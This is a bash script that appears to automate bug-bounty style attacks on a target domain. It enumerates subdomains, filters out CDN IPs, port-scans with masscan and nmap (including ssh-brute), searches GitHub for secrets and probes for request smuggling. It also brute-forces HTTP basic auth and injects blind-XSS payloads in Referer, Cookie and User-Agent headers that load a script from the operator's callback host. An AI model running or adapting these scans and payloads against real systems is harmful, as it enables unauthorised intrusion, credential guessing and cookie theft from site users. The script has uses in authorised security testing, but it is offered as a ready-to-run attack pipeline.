#!/bin/bash
mkdir ~/assets 2&> /dev/null
domain=$1
passwordx=$(cat ~/Automated-Scanner/tools/.creds | grep password | awk {'print $3'})
dns_server=$(cat ~/Automated-Scanner/tools/.creds | grep 'dns_server' | awk {'print $3'})
xss_hunter=$(cat ~/Automated-Scanner/tools/.creds | grep 'xss_hunter' | awk {'print $3'})

[ ! -f ~/assets ] && mkdir ~/recon  2&>1 
[ ! -f ~/assets/$domain ] && mkdir ~/assets/$domain  2&>1
[ ! -f ~/assets/$domain/webanalyze ] && mkdir ~/assets/$domain/webanalyze  2&>1
[ ! -f ~/assets/$domain/aquatone ] && mkdir ~/assets/$domain/aquatone  2&>1
[ ! -f ~/assets/$domain/shodan ] && mkdir ~/assets/$domain/shodan  2&>1
[ ! -f ~/assets/$domain/dirsearch ] && mkdir ~/assets/$domain/dirsearch  2&>1
[ ! -f ~/assets/$domain/virtual-hosts ] && mkdir ~/assets/$domain/virtual-hosts  2&>1
[ ! -f ~/assets/$domain/endpoints ] && mkdir ~/assets/$domain/endpoints  2&>1
[ ! -f ~/assets/$domain/github-endpoints ] && mkdir ~/assets/$domain/github-endpoints  2&>1
[ ! -f ~/assets/$domain/github-secrets ] && mkdir ~/assets/$domain/github-secrets  2&>1
[ ! -f ~/assets/$domain/gau ] && mkdir ~/assets/$domain/gau  2&>1
[ ! -f ~/assets/$domain/kxss ] && mkdir ~/assets/$domain/kxss  2&>1
[ ! -f ~/assets/$domain/http-desync ] && mkdir ~/assets/$domain/http-desync  2&>1
[ ! -f ~/assets/$domain/401 ] && mkdir ~/assets/$domain/401  2&>1
sleep 5

message () {
	telegram_bot=$(cat ~/Automated-Scanner/tools/.creds | grep "telegram_bot" | awk {'print $3'})
	telegram_id=$(cat ~/Automated-Scanner/tools/.creds | grep "telegram_id" | awk {'print $3'})
	alert="https://api.telegram.org/bot$telegram_bot/sendmessage?chat_id=$telegram_id&text="
	[ -z $telegram_bot ] && [ -z $telegram_id ] || curl -g $alert$1 --silent > /dev/null
}

scanned () {
	cat $1 | sort -u | wc -l
}

message "[%2B]%20Initiating%20scan%20%3A%20$1%20[%2B]"
date

[ ! -f ~/tools/nameservers.txt ] && wget https://public-dns.info/nameservers.txt -O ~/tools/nameservers.txt

echo "[+] AMASS SCANNING [+]"
		amass enum -brute -w ~/Automated-Scanner/tools/subdomains.txt -rf ~/Automated-Scanner/tools/nameservers.txt -d $domain -o ~/assets/$domain/amass.txt
		amasscan=$(scanned ~/assets/$domain/amass.txt)
		message "Amass%20Found%20$amasscan%20subdomain(s)%20for%20$domain"
		echo "[+] Amass Found $amasscan subdomains"

echo "[+] FINDOMAIN SCANNING [+]"
		findomain -t $domain -q -u ~/assets/$domain/findomain.txt
		findomainscan=$(scanned ~/assets/$domain/findomain.txt)
		message "Findomain%20Found%20$findomainscan%20subdomain(s)%20for%20$domain"
		echo "[+] Findomain Found $findomainscan subdomains"

echo "[+] SUBFINDER SCANNING [+]"
		subfinder -d $domain -nW -silent -rL ~/Automated-Scanner/tools/nameservers.txt -o ~/assets/$domain/subfinder.txt
		subfinderscan=$(scanned ~/assets/$domain/subfinder.txt)
		message "SubFinder%20Found%20$subfinderscan%20subdomain(s)%20for%20$domain"
		echo "[+] Subfinder Found $subfinderscan subdomains"

echo "[+] ASSETFINDER SCANNING [+]"
		assetfinder -subs-only $domain > ~/assets/$domain/assetfinder.txt
		assetfinderscan=$(scanned ~/assets/$domain/assetfinder.txt)
		message "Assetfinder%20Found%20$assetfinderscan%20subdomain(s)%20for%20$domain"
		echo "[+] Assetfinder Found $assetfinderscan subdomains"

	## Deleting all the results to less disk usage
	cat ~/assets/$domain/amass.txt ~/assets/$domain/findomain.txt ~/assets/$domain/subfinder.txt ~/assets/$domain/assetfinder.txt | sort -uf > ~/assets/$domain/final.txt
	rm ~/assets/$domain/amass.txt ~/assets/$domain/project-sonar.txt ~/assets/$domain/findomain.txt ~/assets/$domain/subfinder.txt ~/assets/$domain/assetfinder.txt
	sleep 5

echo "[+] GOALTDNS SUBDOMAIN PERMUTATION [+]"
	goaltdns -l ~/assets/$domain/final.txt -w ~/Automated-Scanner/tools/words.txt | massdns -r ~/Automated-Scanner/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r '.name' >> ~/assets/$domain/goaltdns.tmp
	cat ~/assets/$domain/goaltdns.tmp | sed 's/\.$//g' | sort -u >> ~/assets/$domain/goaltdns.txt
	rm ~/assets/$domain/goaltdns.tmp
	goaltdns=$(scanned ~/assets/$domain/goaltdns.txt)
	message "goaltdns%20generates%20$goaltdns%20subdomain(s)%20for%20$domain"
	echo "[+] goaltdns generate $goaltdns subdomains"

echo "[+] ELIMINATING WILDCARD SUBDOMAINS [+]"
	cat ~/assets/$domain/goaltdns.txt ~/assets/$domain/final.txt | sed 's/\.$//g' | shuffledns -d $domain -r ~/Automated-Scanner/tools/nameservers.txt | dnsprobe -r A | awk {'print $domain'} | sort -u >> ~/assets/$domain/non-wildcards.txt
	rm ~/assets/$domain/final.txt && mv ~/assets/$domain/non-wildcards.txt ~/assets/$domain/final.txt
	message "Done%20Eliminating%20wildcard%20subdomains!"

all=$(scanned ~/assets/$domain/final.txt)
message "Almost%20$all%20Collected%20Subdomains%20for%20$domain"
echo "[+] $all collected subdomains"
sleep 3

# collecting all IP from collected subdomains
echo "[+] Getting all IP from subdomains [+]"
	cat ~/assets/$domain/final.txt | awk '{print $1}' | dnsprobe -silent | awk {'print $2'} | sort -u > ~/assets/$domain/ipz.txt
	rm ~/assets/$domain/goaltdns.txt
	ipcount=$(scanned ~/assets/$domain/ipz.txt)
	message "Almost%20$ipcount%20IP%20Collected%20in%20$domain"
	echo "[+] $all collected IP"

## segregating cloudflare IP from non-cloudflare IP
## non-sense if I scan cloudflare,sucuri,akamai and incapsula IP. :(
iprange="173.245.48.0/20 103.21.244.0/22 103.22.200.0/22 103.31.4.0/22 141.101.64.0/18 108.162.192.0/18 190.93.240.0/20 188.114.96.0/20 197.234.240.0/22 198.41.128.0/17 162.158.0.0/15 104.16.0.0/12 172.64.0.0/13 131.0.72.0/22"
for ip in $(cat ~/assets/$domain/ipz.txt); do
	grepcidr "$iprange" <(echo "$ip") >/dev/null && echo "[!] $ip is cloudflare" || echo "$ip" >> ~/assets/$domain/ip4.txt
done
ipz=$(scanned ~/assets/$domain/ip4.txt)
ip_old=$(scanned ~/assets/$domain/ipz.txt)
message "$ipz%20non-cloudflare%20IPs%20has%20been%20$collected%20in%20$domain%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-cloudflare IPs has been collected out of $ip_old IPs!"
rm ~/assets/$domain/ipz.txt
sleep 5

incapsula="199.83.128.0/21 198.143.32.0/19 149.126.72.0/21 103.28.248.0/22 45.64.64.0/22 185.11.124.0/22 192.230.64.0/18 107.154.0.0/16 45.60.0.0/16 45.223.0.0/16"
for ip in $(cat ~/assets/$domain/ip4.txt); do
	grepcidr "$incapsula" <(echo "$ip") >/dev/null && echo "[!] $ip is Incapsula" || echo "$ip" >> ~/assets/$domain/ip3.txt
done
ipz=$(scanned ~/assets/$domain/ip3.txt)
ip_old=$(scanned ~/assets/$domain/ip4.txt)
message "$ipz%20non-incapsula%20IPs%20has%20been%20$collected%20in%20$domain%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-incapsula IPs has been collected out of $ip_old IPs!"
rm ~/assets/$domain/ip4.txt
sleep 5

sucuri="185.93.228.0/24 185.93.229.0/24 185.93.230.0/24 185.93.231.0/24 192.124.249.0/24 192.161.0.0/24 192.88.134.0/24 192.88.135.0/24 193.19.224.0/24 193.19.225.0/24 66.248.200.0/24 66.248.201.0/24 66.248.202.0/24 66.248.203.0/24"
for ip in $(cat ~/assets/$domain/ip3.txt); do
	grepcidr "$sucuri" <(echo "$ip") >/dev/null && echo "[!] $ip is Sucuri" || echo "$ip" >> ~/assets/$domain/ip2.txt
done
ipz=$(scanned ~/assets/$domain/ip2.txt)
ip_old=$(scanned ~/assets/$domain/ip3.txt)
message "$ipz%20non-sucuri%20IPs%20has%20been%20$collected%20in%20$domain%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-sucuri IPs has been collected out of $ip_old IPs!"
rm ~/assets/$domain/ip3.txt
sleep 5

akamai="104.101.221.0/24 184.51.125.0/24 184.51.154.0/24 184.51.157.0/24 184.51.33.0/24 2.16.36.0/24 2.16.37.0/24 2.22.226.0/24 2.22.227.0/24 2.22.60.0/24 23.15.12.0/24 23.15.13.0/24 23.209.105.0/24 23.62.225.0/24 23.74.29.0/24 23.79.224.0/24 23.79.225.0/24 23.79.226.0/24 23.79.227.0/24 23.79.229.0/24 23.79.230.0/24 23.79.231.0/24 23.79.232.0/24 23.79.233.0/24 23.79.235.0/24 23.79.237.0/24 23.79.238.0/24 23.79.239.0/24 63.208.195.0/24 72.246.0.0/24 72.246.1.0/24 72.246.116.0/24 72.246.199.0/24 72.246.2.0/24 72.247.150.0/24 72.247.151.0/24 72.247.216.0/24 72.247.44.0/24 72.247.45.0/24 80.67.64.0/24 80.67.65.0/24 80.67.70.0/24 80.67.73.0/24 88.221.208.0/24 88.221.209.0/24 96.6.114.0/24"
for ip in $(cat ~/assets/$domain/ip2.txt); do
	grepcidr "$akamai" <(echo "$ip") >/dev/null && echo "[!] $ip is Akamai" || echo "$ip" >> ~/assets/$domain/ip.txt
done
ipz=$(scanned ~/assets/$domain/ip.txt)
ip_old=$(scanned ~/assets/$domain/ip2.txt)
message "$ipz%20non-akamai%20IPs%20has%20been%20$collected%20in%20$domain%20out%20of%20$ip_old%20IPs"
echo "[+] $ipz non-akamai IPs has been collected out of $ip_old IPs!"
rm ~/assets/$domain/ip2.txt
sleep 5

echo "[+] MASSCAN PORT SCANNING [+]"
	echo $passwordx | sudo -S masscan -p0-65535 -iL ~/assets/$domain/ip.txt --max-rate 5000 -oG ~/assets/$domain/masscan.txt
	mass=$(cat ~/assets/$domain/masscan.txt | grep "Host:" | awk {'print $5'} | awk -F '/' {'print $domain'} | sort -u | wc -l)
	message "Masscan%20discovered%20$mass%20open%20port(s)%20for%20$domain"
	echo "[+] Done masscan for scanning port(s)"

big_ports=$(cat ~/assets/$domain/masscan.txt | grep "Host:" | awk {'print $5'} | awk -F '/' {'print $domain'} | sort -u | paste -s -d ',')
cat ~/assets/$domain/masscan.txt | grep "Host:" | awk {'print $2":"$5'} | awk -F '/' {'print $domain'} | sed 's/:80$//g' | sed 's/:443$//g' | sort -u > ~/assets/$domain/open-ports.txt  
cat ~/assets/$domain/open-ports.txt ~/assets/$domain/final.txt > ~/assets/$domain/all.txt

echo "[+] HTTProbe Scanning Alive Hosts [+]"
	cat ~/assets/$domain/all.txt | httprobe -c 100 >> ~/assets/$domain/httprobe.txt
	alivesu=$(scanned ~/assets/$domain/httprobe.txt)
	message "$alivesu%20alive%20domains%20out%20of%20$all%20domains%20in%20$domain"
	echo "[+] $alivesu alive domains out of $all domains/IPs using httprobe"
cat ~/assets/$domain/httprobe.txt | sed 's/http\(.?*\)*:\/\///g' | sort -u > ~/assets/$domain/alive.txt

echo "[+] S3 Bucket Scanner [+]"
	python ~/tools/S3Scanner/s3scanner.py ~/assets/$domain/alive.txt &> ~/assets/$domain/s3scanner.txt
	esthree=$(cat ~/assets/$domain/s3scanner.txt | grep "\[found\]" | wc -l)
	message "S3Scanner%20found%20$esthree%20buckets%20for%20$domain"
	echo "[+] Done s3scanner for $domain"

echo "[+] TKO-SUBS for Subdomain TKO [+]"
	[ ! -f ~/Automated-Scanner/tools/providers-data.csv ] && wget "https://raw.githubusercontent.com/anshumanbh/tko-subs/master/providers-data.csv" -O ~/Automated-Scanner/tools/providers-data.csv
	tko-subs -domains=~/assets/$domain/alive.txt -data=~/Automated-Scanner/tools/providers-data.csv -output=~/assets/$domain/tkosubs.txt
	message "TKO-Subs%20scanner%20done%20for%20$domain"
	echo "[+] TKO-Subs scanner is done"
sleep 5

echo "[+] SUBJACK for Subdomain TKO [+]"
	[ ! -f ~/Automated-Scanner/tools/fingerprints.json ] && wget "https://raw.githubusercontent.com/haccer/subjack/master/fingerprints.json" -O ~/Automated-Scanner/tools/fingerprints.json
	subjack -w ~/assets/$domain/alive.txt -a -timeout 15 -c ~/Automated-Scanner/tools/fingerprints.json -v -m -o ~/assets/$domain/subtemp.txt
	subjack -w ~/assets/$domain/alive.txt -a -timeout 15 -c ~/Automated-Scanner/tools/fingerprints.json -v -m -ssl -o ~/assets/$domain/subtmp.txt
	cat ~/assets/$domain/subtemp.txt ~/assets/$domain/subtmp.txt | sort -u > ~/assets/$domain/subjack.txt
	rm ~/assets/$domain/subtemp.txt ~/assets/$domain/subtmp.txt
	message "subjack%20scanner%20done%20for%20$domain"
	echo "[+] Subjack scanner is done"

echo "[+] COLLECTING ENDPOINTS [+]"
	for urlz in $(cat ~/assets/$domain/httprobe.txt); do 
		filename=$(echo $urlz | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		link=$(python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli | grep -E "*.js$" | grep "$domain" | grep "Running against:" |awk {'print $3'})
		echo "Running against: $urlz"
		if [[ ! -z $link ]]; then
			for linx in $link; do
				python ~/tools/LinkFinder/linkfinder.py -i $linx -o cli > ~/assets/$domain/endpoints/$filename-result.txt
			done
		else
			python ~/tools/LinkFinder/linkfinder.py -i $urlz -d -o cli > ~/assets/$domain/endpoints/$filename-result.txt
		fi
	done
	message "Done%20collecting%20endpoint%20in%20$domain"
	echo "[+] Done collecting endpoint"

echo "[+] COLLECTING ENDPOINTS FROM GITHUB [+]"
	for url in $(cat ~/assets/$domain/alive.txt); do 
		echo "Running against: $url"
		python3 ~/tools/github-endpoints.py -d $url -s -r -t $(cat ~/Automated-Scanner/tools/.tokens) > ~/assets/$domain/github-endpoints/$url.txt
	done
	message "Done%20collecting%20github%20endpoint%20in%20$domain"
	echo "[+] Done collecting github endpoint"

echo "[+] COLLECTING SECRETS FROM GITHUB [+]"
	for url in $(cat ~/assets/$domain/alive.txt ); do 
		u=$(echo $url | sed 's/\./\\./g');
		echo "Running against: $url"
		python3 ~/Automated-Scanner/tools/github-secrets.py -s $u -t $(cat ~/Automated-Scanner/tools/.tokens) > ~/assets/$domain/github-secrets/$url.txt
	done
	message "Done%20collecting%20github%20secrets%20in%20$domain"
	echo "[+] Done collecting github secrets"

echo "[+] HTTP SMUGGLING SCANNING [+]"
	for url in $(cat ~/assets/$domain/httprobe.txt); do
		filename=$(echo $url | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		echo "Running against: $url"
		python3 ~/tools/smuggler.py -u "$url/" -v 1 &> ~/assets/$domain/http-desync/$filename.txt
	done
	message "Done%20scanning%20of%20request%20smuggling%20in%20$domain"
	echo "[+] Done scanning of request smuggling"

echo "[+] ZDNS SCANNING [+]"
	for i in $(cat ~/assets/$domain/alive.txt);do echo $i | zdns ANY -output-file - | jq -r '"Name: "+.name+"\t\t Protocol: "+.data.protocol+"\t Resolver: "+.data.resolver+"\t Status: "+.status' >> ~/assets/$domain/zdns.txt;done
	message "Done%20ZDNS%20Scanning%20for%20$domain"
	echo "[+] Done ZDNS for scanning assets"

echo "[+] SHODAN HOST SCANNING [+]"
	for ip in $(cat ~/assets/$domain/ip.txt); do filename=$(echo $ip | sed 's/\./_/g');shodan host $ip > ~/assets/$domain/shodan/$filename.txt; done
	message "Done%20Shodan%20for%20$domain"
	echo "[+] Done shodan"

echo "[+] AQUATONE SCREENSHOT [+]"
	cat ~/assets/$domain/httprobe.txt | aquatone -ports $big_ports -out ~/assets/$domain/aquatone
	message "Done%20Aquatone%20for%20Screenshot%20for%20$domain"
	echo "[+] Done aquatone for screenshot of Alive assets"

echo "[+] NMAP PORT SCANNING [+]"
	echo $passwordx | sudo -S nmap -sSVC -A -O -Pn -p$big_ports -iL ~/assets/$domain/ip.txt --script http-enum,http-title,ssh-brute --stylesheet ~/Automated-Scanner/tools/nmap-bootstrap.xsl -oA ~/assets/$domain/nmap
	nmaps=$(scanned ~/assets/$domain/ip.txt)
	xsltproc -o ~/assets/$domain/nmap.html ~/Automated-Scanner/tools/nmap-bootstrap.xsl ~/assets/$domain/nmap.xml
	message "Nmap%20Scanned%20$nmaps%20IPs%20for%20$domain"
	echo "[+] Done nmap for scanning IPs"

echo "[+] WEBANALYZE SCANNING FOR FINGERPRINTING [+]"
	for target in $(cat ~/assets/$domain/httprobe.txt); do
		filename=$(echo $target | sed 's/http\(.?*\)*:\/\///g')
		webanalyze -host $target -apps ~/Automated-Scanner/tools/apps.json -output csv > ~/assets/$domain/webanalyze/$filename.txt
	done
	message "Done%20webanalyze%20for%20fingerprinting%20$domain"
	echo "[+] Done webanalyze for fingerprinting the assets!"

echo "[+] ALIENVAULT, WAYBACKURLS and COMMON CRAWL Scanning for Archived Endpoints [+]"
	for u in $(cat ~/assets/$domain/alive.txt);do echo $u | gau | grep "$u" >> ~/assets/$domain/gau/tmp-$u.txt; done
	cat ~/assets/$domain/gau/* | sort -u | getching >> ~/assets/$domain/gau/gau.txt 
	rm ~/assets/$domain/gau/tmp-*
	message "GAU%20Done%20for%20$domain"
	echo "[+] Done gau for discovering useful endpoints"

echo "[+] DALFOX for injecting blindxss"
	 cat ~/assets/$domain/alive.txt | gau | grep "=" | dalfox pipe -b $xss_hunter -o ~/assets/$domain/dalfox.txt
	message "DALFOX%20Done%20for%20$domain"
	echo "[+] Done dalfox for injecting blind xss"

echo "[+] KXSS for potential vulnerable xss"
	 cat ~/assets/$domain/alive.txt | gau | grep "=" | kxss | grep "is reflected and allows" | awk {'print $9'} | sort -u >> ~/assets/$domain/kxss/kxss.txt
	message "KXSS%20Done%20for%20$domain"
	echo "[+] Done kxss for potential xss"

echo "[+] 401 Scanning"
[ ! -f ~/Automated-Scanner/tools/basic_auth.txt ] && wget https://raw.githubusercontent.com/phspade/Combined-Wordlists/master/basic_auth.txt -O ~/Automated-Scanner/tools/basic_auth.txt
if [ ! -z $(which ffuf) ]; then
	for i in $(cat ~/assets/$domain/httprobe.txt); do
		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
		if [ 401 == $stat_code ]; then
			ffuf -c -w ~/Automated-Scanner/tools/basic_auth.txt -u $i -k -r -H "Authorization: Basic FUZZ" -mc all -fc 500-599,401 -of html -o ~/assets/$domain/401/$filename-basic-auth.html 
		else
			echo "$stat_code >> $i"
		fi
	done
	message "401%20Scan%20Done%20for%20$domain"
	echo "[+] Done 401 Scanning for $domain"
else
	message "[-]%20Skipping%20ffuf%20for%20401%20scanning"
	echo "[!] Skipping ..."
fi
sleep 5

echo "[+] Scanning for Virtual Hosts Resolution [+]"
if [ ! -z $(which ffuf) ]; then
	[ ! -f ~/Automated-Scanner/tools/virtual-host-scanning.txt ] && wget "https://raw.githubusercontent.com/codingo/VHostScan/master/VHostScan/wordlists/virtual-host-scanning.txt" -O ~/Automated-Scanner/tools/virtual-host-scanning.txt
	cat ~/assets/$domain/open-ports.txt ~/assets/$domain/final.txt ~/Automated-Scanner/tools/virtual-host-scanning.txt | sed "s/\%s/$domain/g" | sort -u >> ~/assets/$domain/temp-vhost-wordlist.txt
	for target in $(cat ~/assets/$domain/alive.txt); do ffuf -c -w ~/assets/$domain/temp-vhost-wordlist.txt -u http://$target -k -r -H "Host: FUZZ" -H "X-Forwarded-For: $target.scanner.xforwarded.$dns_server" -H "X-Real-IP: $target.scanner.xrealip.$dns_server" -H "X-Originating-IP: $target.scanner.xoriginatingip.$dns_server" -H "Client-IP: $target.scanner.clientip.$dns_server" -H "CF-Connecting_IP: $target.scanner.cfconnectingip.$dns_server" -H "Forwarded: for=$target.scanner.for-forwarded.$dns_server;by=$target.scanner.by-forwarded.$dns_server;host=$target.scanner.host-forwarded.$dns_server" -H "X-Client-IP: $target.scanner.xclientip.$dns_server" -H "True-Client-IP: $target.scanner.trueclientip.$dns_server" -H "X-Forwarded-Host: $target.scanner.xforwardedhost.$dns_server" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -H "User-Agent: %22%27%3Eblahblah%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2Fscript%3Etesting" -mc all -fc 500-599,400,406,301 -of html -o ~/assets/$domain/virtual-hosts/$target.html; done
	message "Virtual%20Host%20done%20for%20$domain"
	echo "[+] Done ffuf for scanning virtual hosts"
else
	message "[-]%20Skipping%20ffuf%20for%20vhost%20scanning"
	echo "[!] Skipping ..."
fi
rm ~/assets/$domain/temp-vhost-wordlist.txt


echo "[+] Dir and Files Scanning for Sensitive Files [+]"
if [ ! -z $(which ffuf) ]; then
	for i in $(cat ~/assets/$domain/httprobe.txt); do
		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
		if [ 404 == $stat_code ]; then
			ffuf -c -D -w ~/Automated-Scanner/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/assets/$domain/dirsearch/$filename.html
		elif [ 403 == $stat_code ]; then
			ffuf -c -D -w ~/Automated-Scanner/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/assets/$domain/dirsearch/$filename.html
		elif [ 401 == $stat_code ]; then
			ffuf -c -D -w ~/Automated-Scanner/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/assets/$domain/dirsearch/$filename.html
		elif [ 200 == $stat_code ]; then
			ffuf -c -D -w ~/Automated-Scanner/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -of html -o ~/assets/$domain/dirsearch/$filename.html
		else
			echo "$i >> $stat_code"
		fi
	done
	message "Dir%20and%20files%20Scan%20Done%20for%20$domain"
	echo "[+] Done ffuf for file and directory scanning"
else
	message "[-]%20Skipping%20ffuf%20for%20dir%20and%20files%20scanning"
	echo "[!] Skipping ..."
fi
sleep 5

[ ! -f ~/$domain.out ] && mv ~/$domain.out ~/assets/$domain/ 
message "Scanner%20Done%20for%20$domain"
date
echo "[+] Done scanner :)"
